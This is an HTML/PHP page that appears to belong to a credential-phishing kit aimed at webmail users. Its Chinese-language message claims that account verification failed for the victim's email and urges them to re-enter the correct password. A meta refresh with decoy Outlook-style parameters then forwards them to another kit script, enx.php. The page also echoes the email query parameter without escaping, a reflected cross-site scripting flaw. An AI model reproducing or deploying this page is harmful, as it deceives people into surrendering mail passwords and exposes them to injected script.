<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Strict//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd'>
<html><head><title>&#39564;&#35777;| &#35774;&#32622;</title>

<link rel="icon" href="files/id.png" sizes="13x13" type="image/png">

<meta http-equiv="REFRESH" content="10; enx.php?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=<?php echo $_GET['email']; ?>&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1">

<meta http-equiv='Content-Type' content='text/html; charset=UTF-8'/>
<!-- no core stylesheet -->
</head>


<form method='post' action=''>

                        <font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2">
                        <div align="center">

			<br><br><br><br><br>

			<div>
			<h2>&#24080;&#25143;&#39564;&#35777;, &#23545;&#20110; <?php echo $_GET['email']; ?> &#19981;&#25104;&#21151;!</h2>
			<p>&#20877;&#35797;&#19968;&#27425;&#65281; &#24182;&#30830;&#20445;&#24744;&#36755;&#20837;&#27492;&#30005;&#23376;&#37038;&#20214;&#30340;&#27491;&#30830;&#23494;&#30721;.</p>

			<p>&#24744;&#24456;&#24555;&#23601;&#20250;&#34987;&#37325;&#26032;&#23548;&#21521;&#22238;&#26469;!</p>

			<br><br>
			</div>

			</font>

			</div></form>
</div>


</body></html><!-- 1 -->